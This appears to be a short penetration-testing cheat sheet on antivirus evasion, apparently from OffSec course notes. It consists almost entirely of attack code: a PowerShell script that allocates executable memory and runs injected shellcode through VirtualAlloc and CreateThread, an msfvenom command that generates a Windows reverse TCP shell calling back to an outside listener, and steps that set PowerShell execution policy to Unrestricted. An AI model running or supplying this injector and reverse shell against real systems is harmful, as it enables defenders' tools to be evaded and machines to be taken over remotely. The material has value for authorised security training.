# Anti-Virus Evasion

### In-memory injection script:

{% code overflow="wrap" %}
```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$var1= Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]] $var2 = {insert_payload};

$size = 0x1000;

if ($var2.Length -gt 0x1000) {$size = $var2.Length};

$x = $var1::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($var2.Length-1);$i++) {$var1::memset([IntPtr]($x.ToInt32()+$i), $var2[$i], 1)};

$var1::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```
{% endcode %}

Generate sc:

{% code overflow="wrap" %}
```shell
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc
```
{% endcode %}

Change execution policy for the user:

{% code overflow="wrap" %}
```powershell
PS C:\Users\offsec\Desktop> Get-ExecutionPolicy -Scope CurrentUser
Undefined

PS C:\Users\offsec\Desktop> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help Module at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A

PS C:\Users\offsec\Desktop> Get-ExecutionPolicy -Scope CurrentUser
Unrestricted
```
{% endcode %}
